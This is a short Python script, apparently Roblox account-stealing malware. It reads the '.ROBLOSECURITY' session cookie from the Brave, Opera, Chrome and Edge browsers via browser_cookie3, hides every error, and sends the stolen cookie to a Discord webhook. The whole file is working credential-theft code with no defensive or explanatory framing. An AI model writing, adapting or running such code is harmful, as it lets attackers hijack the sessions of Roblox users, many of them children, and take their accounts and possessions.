import os
import browser_cookie3
from discord_webhook import DiscordWebhook
import base64

RobloxCookie = []

WebhookUrl = ""


def get_roblox_cookie():
    try:
        robloxcookies = browser_cookie3.brave(domain_name="roblox.com")
        for robloxcookie in robloxcookies:
            if robloxcookie.name == ".ROBLOSECURITY":
                RobloxCookie.append(robloxcookies)
                RobloxCookie.append(robloxcookie.value)
                return RobloxCookie
    except:
        pass
    try:
        robloxcookies = browser_cookie3.opera(domain_name="roblox.com")
        for robloxcookie in robloxcookies:
            if robloxcookie.name == ".ROBLOSECURITY":
                RobloxCookie.append(robloxcookies)
                RobloxCookie.append(robloxcookie.value)
                return RobloxCookie
    except:
        pass
    try:
        robloxcookies = browser_cookie3.chrome(domain_name="roblox.com")
        for robloxcookie in robloxcookies:
            if robloxcookie.name == ".ROBLOSECURITY":
                RobloxCookie.append(robloxcookies)
                RobloxCookie.append(robloxcookie.value)
                return RobloxCookie
    except:
        pass
    try:
        robloxcookies = browser_cookie3.edge(domain_name="roblox.com")
        for robloxcookie in robloxcookies:
            if robloxcookie.name == ".ROBLOSECURITY":
                RobloxCookie.append(robloxcookies)
                RobloxCookie.append(robloxcookie.value)
                return RobloxCookie
    except:
        pass

get_roblox_cookie()

roblox_cookiex = RobloxCookie[1]

webhook = DiscordWebhook(url=WebhookUrl, content=f"```Roblox Cookie:\n\n {roblox_cookiex}\n\n\n```")

webhook.execute()